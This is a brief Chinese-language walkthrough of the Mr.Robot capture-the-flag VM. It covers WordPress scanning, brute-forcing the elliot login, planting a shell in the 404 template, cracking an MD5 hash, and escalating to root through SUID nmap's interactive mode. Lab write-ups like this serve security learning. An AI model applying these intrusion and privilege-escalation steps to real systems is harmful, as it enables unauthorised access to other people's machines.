# Mr.Robot  
## 信息收集   
使用目录扫描的工具进行扫描目录   
![20211016164711](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211016164711.png)
wordpress 的页面直接使用wordpress扫漏洞就对了  
另外在 robots.txt 当中发现两个东西 一个是秘密 一个是字典  
![20211016164723](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211016164723.png)
##  漏洞扫描 
### wpscan  
使用wpscan进行扫描获得这些漏洞
 | [!] Title: WordPress 4.3-4.7 - Remote Code Execution (RCE) in PHPMailer
 |     Fixed in: 4.3.7
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8714
 |      - https://www.wordfence.com/blog/2016/12/phpmailer-vulnerability/
 |      - https://github.com/PHPMailer/PHPMailer/wiki/About-the-CVE-2016-10033-and-CVE-2016-10045-vulnerabilities
 |      - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/24767c76d359231642b0ab48437b64e8c6c7f491
 |      - http://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html
 |      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_phpmailer_host_header


### 字典去重  
cat fsocity.dic|sort|uniq > dict.txt  
直接爆破  
首先爆破用户名 elliot  
然后爆破密码 
404页面写的shell  
![20211016164815](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211016164815.png)
得到shell python交互式 
解开md5  
登录之后  
```
find / -perm -u=s -type f 2>/dev/null   
```
![20211016164826](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211016164826.png)
 nmap --interactive 
 !sh  
结束  

echo 'os.execute("/bin/sh")' > getShell  

